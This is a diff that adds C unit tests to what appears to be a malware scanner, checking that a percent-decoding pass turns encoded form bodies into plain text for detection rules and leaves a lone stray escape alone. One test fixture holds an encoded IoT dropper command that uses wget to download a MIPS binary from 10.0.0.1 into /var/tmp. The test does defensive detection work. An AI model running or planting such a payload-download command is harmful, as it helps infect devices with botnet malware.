@@ -997,6 +997,64 @@ static void decode_follows_the_layers(void)
 	      "two layers of hex, and the second round is what got it");
 }
 
+/* ------------------------------------------------------------------------
+ * PERCENT-ENCODED TEXT.
+ *
+ * ONE ESCAPE FORM AND NOT A FAMILY. An IoT dropper carries its exploits as
+ * form bodies, and the command inside them is encoded by the protocol rather
+ * than by the author - so the bytes a rule would be written against are not in
+ * the file. Decoding `%XX` puts them there. Nothing here decodes `\xNN` or any
+ * other convention; each would need its own measurement.
+ */
+static void pct_decodes_a_form_body(void)
+{
+	static const char in[] =
+		" Cmd=wget+http%3A%2F%2F10.0.0.1%2Fmips+-O+%2Fvar%2Ftmp%2Finit";
+	uint8_t buf[128];
+	uint64_t n = sizeof in - 1u;
+
+	memcpy(buf, in, (size_t)n);
+	check(kof_exe_decode(buf, n) == 1,
+	      "pct: an encoded command is decoded",
+	      "four escapes, printable, and delimited");
+	check(memmem(buf, (size_t)n, "wget http://10.0.0.1/mips", 25) != NULL,
+	      "pct: and it reads as the command",
+	      "which is what a rule would be written against");
+	check(memmem(buf, (size_t)n, "%3A", 3) == NULL,
+	      "pct: the escapes are gone",
+	      "a second pass has nothing left to find");
+	/*
+	 * `+` IS A SPACE HERE. A form body spells the separator that way, and
+	 * left alone the decoded text reads "wget+http://" - which a rule
+	 * written on the plain command still misses.
+	 */
+	check(memmem(buf, (size_t)n, "wget+", 5) == NULL,
+	      "pct: and the pluses are spaces",
+	      "the separator a form body uses");
+}
+
+/*
+ * AND A RUN WITH TOO FEW OF THEM IS LEFT ALONE.
+ *
+ * A stray "%2e" in a version string or a format is not an encoded payload, and
+ * a scanner that rewrote it would be changing bytes on a guess. The floor is
+ * the same shape the hex pass uses and exists for the same reason.
+ */
+static void pct_leaves_a_stray_escape(void)
+{
+	static const char in[] = " version=1.0%2e3 and nothing else here";
+	uint8_t buf[128];
+	uint64_t n = sizeof in - 1u;
+
+	memcpy(buf, in, (size_t)n);
+	check(kof_exe_decode(buf, n) == 0,
+	      "pct: one escape is not a payload",
+	      "under the floor, so nothing is rewritten");
+	check(!memcmp(buf, in, (size_t)n),
+	      "pct: and the bytes are untouched",
+	      "a guess that changed the object would be worse than a miss");
+}
+
 int main(void)
 {
 	printf("normalize exe:\n");
@@ -1026,6 +1084,8 @@ int main(void)
 	an_empty_view_is_not_an_unchanged_one();
 
 	hex_decodes_a_command();
+	pct_decodes_a_form_body();
+	pct_leaves_a_stray_escape();
 	hex_refuses_a_hash();
 	hex_needs_a_delimiter();
 	hex_ignores_a_short_run();
